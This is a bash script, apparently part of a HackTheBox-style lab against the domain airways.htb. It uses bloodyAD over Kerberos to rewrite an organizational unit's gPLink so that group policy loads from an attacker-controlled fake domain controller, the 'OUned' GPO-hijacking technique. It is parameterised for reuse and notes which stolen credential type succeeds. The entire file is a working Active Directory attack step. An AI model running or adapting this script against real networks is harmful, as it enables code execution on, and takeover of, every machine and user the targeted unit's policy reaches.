#!/usr/bin/env bash
# Set OU=IT gPLink to the OUned GPC. Needs PKINIT ccache (GPO-Auditors in PAC).
# NTLM as Isabel returns INSUFF_ACCESS_RIGHTS — do not use -p here.
set -euo pipefail
: "${KRB5CCNAME:?export KRB5CCNAME=./isabel.ccache}"
: "${GPO_GUID:?export GPO_GUID={........-....-....-....-............}}"
DOMAIN="${DOMAIN:-airways.htb}"
DC="${DC_HOST:-DC01.airways.htb}"
FAKE="${FAKE_DNS:-FAKEDC}"
OU="${OU_DN:-OU=IT,OU=Departments,DC=airways,DC=htb}"
VALUE="[LDAP://cn=${GPO_GUID},cn=policies,cn=system,DC=${FAKE},DC=airways,DC=htb;0]"
PC=( )
if [[ -n "${PROXYCHAINS_CONF:-}" ]]; then
  PC=(proxychains4 -f "$PROXYCHAINS_CONF")
fi
"${PC[@]}" bloodyad -d "$DOMAIN" -k --host "$DC" set object "$OU" gPLink -v "$VALUE"
echo "gPLink=$VALUE"
